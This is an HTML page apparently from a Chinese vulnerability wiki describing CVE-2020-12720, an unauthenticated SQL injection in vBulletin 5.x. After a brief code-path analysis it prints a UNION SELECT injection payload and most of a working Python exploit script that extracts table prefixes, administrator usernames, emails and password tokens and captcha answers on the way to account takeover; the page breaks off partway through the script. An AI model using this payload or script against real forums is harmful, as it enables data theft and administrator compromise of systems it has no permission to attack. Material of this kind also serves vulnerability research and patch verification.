<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/vBulletin/%EF%BC%88CVE-2020-12720%EF%BC%89vBulletin%20%20%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-12720）vBulletin 未授权sql注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-12720\uff09vBulletin \u672a\u6388\u6743sql\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../vite/CNVD-2022-44615/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../vite/CNVD-2022-44615/" class="btn btn-xs btn-link">
        Vite Development Server Arbitrary File Read (CNVD-2022-44615)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-17132%EF%BC%89vBulletin%205.0%20_5.5.4-%27updateAvatar%27%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-17132%EF%BC%89vBulletin%205.0%20_5.5.4-%27updateAvatar%27%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-17132）vBulletin 5.0 \&lt;5.5.4-\'updateAvatar\'身份验证的远程代码执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-12720vbulletin-sql">（CVE-2020-12720）vBulletin 未授权sql注入漏洞<a class="headerlink" href="#cve-2020-12720vbulletin-sql" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>未经授权的用户可以通过SQL注入获取敏感数据</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>vBulletin 5.5.6pl1之前版本</p>
<p>vBulletin 5.6.0pl1之前的5.6.0版本</p>
<p>vBulletin 5.6.1pl1之前的5.6.1版本</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>漏洞文件：/core/vb/library/content.php</p>
<p><img alt="下载.png" src="../resource/%28CVE-2020-12720%29vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>跟进fillContentTableData方法，直接调用了getRow方法</p>
<p><img alt="下载
1.png" src="../resource/%28CVE-2020-12720%29vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<p>此处getRow方法传入的第一个参数为\'vBForum:getContentTablesData\'，全局搜索getContentTablesData方法</p>
<p><img alt="下载
2.png" src="../resource/%28CVE-2020-12720%29vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<p>nodeid被设置为常量TYPE_NOCLEAN的值，该值为0。</p>
<p>跟进cleanArray方法</p>
<p><img alt="下载
3.png" src="../resource/%28CVE-2020-12720%29vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
<p>变量vartype经过数组处理后即为TYPE_NOCLEAN，随后调用doClean方法进行数据清洗</p>
<p><img alt="下载
4.png" src="../resource/%28CVE-2020-12720%29vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>doClean方法会根据传入的type数值进入到不同的分支进行处理，因为变量vartype为0直接进入到TYPE_NOCLEAN的分支，从而不做清洗处理。</p>
<p>再回到/core/packages/vbforum/db/mysql/querydefs.php文件中，发现后续并没有再对nodeid键值进行处理，直接拼接到SQL语句中，造成了SQL注入漏洞。</p>
<p><img alt="下载
5.png" src="../resource/%28CVE-2020-12720%29vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<p>至于如何利用，就不赘述了，向上追溯调用链即可。</p>
<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="n">nodeId</span><span class="o">[</span><span class="n">nodeid</span><span class="o">]=</span><span class="mi">1</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="nc">text</span><span class="p">.</span><span class="n">nodeid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mi">19</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">26</span><span class="c1">--</span>
</code></pre></div>

<p><img alt="1.png" src="../resource/%28CVE-2020-12720%29vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.png" />打个断点就能快速定位漏洞点<img alt="2.png" src="../resource/%28CVE-2020-12720%29vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="n">CVE</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mf">12720.</span><span class="n">py</span>
<span class="c1"># Exploit Title: vBulletin 5.6.1 - &#39;nodeId&#39; SQL Injection</span>
<span class="c1"># Date: 2020-05-15</span>
<span class="c1"># Exploit Author: Photubias</span>
<span class="c1"># Vendor Advisory: [1] https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1</span>
<span class="c1"># Version: vBulletin v5.6.x (prior to Patch Level 1)</span>
<span class="c1"># Tested on: vBulletin v5.6.1 on Debian 10 x64</span>
<span class="c1"># CVE: CVE-2020-12720 vBulletin v5.6.1 (SQLi) with path to RCE</span>

<span class="c1">#!/usr/bin/env python3</span>
<span class="sd">&#39;&#39;&#39;</span>


<span class="sd">    Copyright 2020 Photubias(c)</span>

<span class="sd">        This program is free software: you can redistribute it and/or modify</span>
<span class="sd">        it under the terms of the GNU General Public License as published by</span>
<span class="sd">        the Free Software Foundation, either version 3 of the License, or</span>
<span class="sd">        (at your option) any later version.</span>

<span class="sd">        This program is distributed in the hope that it will be useful,</span>
<span class="sd">        but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="sd">        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="sd">        GNU General Public License for more details.</span>

<span class="sd">        You should have received a copy of the GNU General Public License</span>
<span class="sd">        along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span>

<span class="sd">        File name CVE-2020-12720.py</span>
<span class="sd">        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be</span>

<span class="sd">        This is a native implementation without requirements, written in Python 3.</span>
<span class="sd">        Works equally well on Windows as Linux (as MacOS, probably ;-)</span>

<span class="sd">        ##--&gt;&gt; Full creds to @zenofex and @rekter0 &lt;&lt;--##</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="n">import</span><span class="w"> </span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="p">,</span><span class="w"> </span><span class="n">sys</span><span class="p">,</span><span class="w"> </span><span class="n">http</span><span class="o">.</span><span class="n">cookiejar</span><span class="p">,</span><span class="w"> </span><span class="n">ssl</span><span class="p">,</span><span class="w"> </span><span class="n">random</span><span class="p">,</span><span class="w"> </span><span class="n">string</span>

<span class="c1">## Static vars; change at will, but recommend leaving as is</span>
<span class="n">sADMINPASS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;12345678&#39;</span>
<span class="n">sCMD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;id&#39;</span>
<span class="n">sURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://192.168.50.130/&#39;</span>
<span class="n">sUSERID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span>
<span class="n">sNEWPASS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;87654321&#39;</span>
<span class="n">iTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span>

<span class="c1">## Ignore unsigned certs</span>
<span class="n">ssl</span><span class="o">.</span><span class="n">_create_default_https_context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ssl</span><span class="o">.</span><span class="n">_create_unverified_context</span>

<span class="c1">## Keep track of cookies between requests</span>
<span class="n">cj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">http</span><span class="o">.</span><span class="n">cookiejar</span><span class="o">.</span><span class="n">CookieJar</span><span class="p">()</span>
<span class="n">oOpener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">HTTPCookieProcessor</span><span class="p">(</span><span class="n">cj</span><span class="p">))</span>

<span class="n">def</span><span class="w"> </span><span class="n">randomString</span><span class="p">(</span><span class="n">stringLength</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
<span class="w">    </span><span class="n">letters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nb">range</span><span class="p">(</span><span class="n">stringLength</span><span class="p">))</span>

<span class="n">def</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sUrl</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">):</span>
<span class="w">    </span><span class="n">try</span><span class="p">:</span>
<span class="w">        </span><span class="n">oData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
<span class="w">        </span><span class="n">oRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sUrl</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oData</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">oOpener</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">oRequest</span><span class="p">,</span><span class="w"> </span><span class="n">timeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iTimeout</span><span class="p">)</span>
<span class="w">    </span><span class="n">except</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----- ERROR, site down?&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">def</span><span class="w"> </span><span class="n">verifyBug</span><span class="p">(</span><span class="n">sURL</span><span class="p">,</span><span class="n">sUserid</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">):</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/api/content_infraction/getIndexableContent&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;nodeId[nodeid]&#39;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,&quot;cve-2020-12720&quot;,8,7,6,5,4,3,2,1;--&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="s1">&#39;cve-2020-12720&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Warning: not vulnerable to CVE-2020-12720, credentials are needed!&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">False</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] SQLi Success!&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">True</span>

<span class="n">def</span><span class="w"> </span><span class="n">takeoverAccount</span><span class="p">(</span><span class="n">sURL</span><span class="p">,</span><span class="w"> </span><span class="n">sNEWPASS</span><span class="p">):</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/api/content_infraction/getIndexableContent&#39;</span>
<span class="w">    </span><span class="c1">### Source: https://github.com/rekter0/exploits/tree/master/CVE-2020-12720</span>
<span class="w">    </span><span class="c1">## Get Table Prefixes</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;nodeId[nodeid]&#39;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,table_name,8,7,6,5,4,3,2,1 from information_schema.columns WHERE column_name=</span><span class="se">\&#39;</span><span class="s1">phrasegroup_cppermission</span><span class="se">\&#39;</span><span class="s1">;--&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;rawtext&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span><span class="w"> </span><span class="n">sPrefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;rawtext&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;language&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span><span class="w"> </span><span class="n">sPrefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">    </span><span class="c1">#print(&#39;[+] Got table prefix &quot;&#39;+sPrefix+&#39;&quot;&#39;)</span>

<span class="w">    </span><span class="c1">## Get usergroup ID for &quot;Administrators&quot;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;nodeId[nodeid]&#39;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,usergroupid,8,7,6,5,4,3,2,1 from &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPrefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;usergroup WHERE title=</span><span class="se">\&#39;</span><span class="s1">Administrators</span><span class="se">\&#39;</span><span class="s1">;--&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="n">sGroupID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;rawtext&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="c1">#print(&#39;[+] Administrators Group ID: &#39;+sGroupID)</span>

<span class="w">    </span><span class="c1">## Get admin data, including original token (password hash), TODO: an advanced exploit could restore the original hash in post exploitation</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;nodeId[nodeid]&#39;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,concat(username,0x7c,userid,0x7c,email,0x7c,token),8,7,6,5,4,3,2,1 from &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPrefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;user where usergroupid=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sGroupID</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;;--&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="n">sUsername</span><span class="p">,</span><span class="n">sUserid</span><span class="p">,</span><span class="n">sUsermail</span><span class="p">,</span><span class="n">sUserTokenOrg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;rawtext&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="c1">#print(&#39;[+] Got original token (&#39; + sUsername + &#39;, &#39; + sUsermail + &#39;): &#39; + sUserTokenOrg)</span>

<span class="w">    </span><span class="c1">## Let&#39;s create a Human Verify Captcha</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/api/hv/generateToken?&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="s1">&#39;guest&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;hash&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span><span class="w"> </span><span class="n">sHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;hash&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span><span class="w"> </span><span class="n">sHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>

<span class="w">    </span><span class="c1">## Get the captcha answer from DB</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/api/content_infraction/getIndexableContent&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;nodeId[nodeid]&#39;</span><span class="p">:</span><span class="s1">&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,count(answer),8,7,6,5,4,3,2,1 from &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPrefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;humanverify limit 0,1--&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;rawtext&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span><span class="w"> </span><span class="n">iAnswers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="p">(</span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;rawtext&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">))</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span><span class="w"> </span><span class="n">iAnswers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>

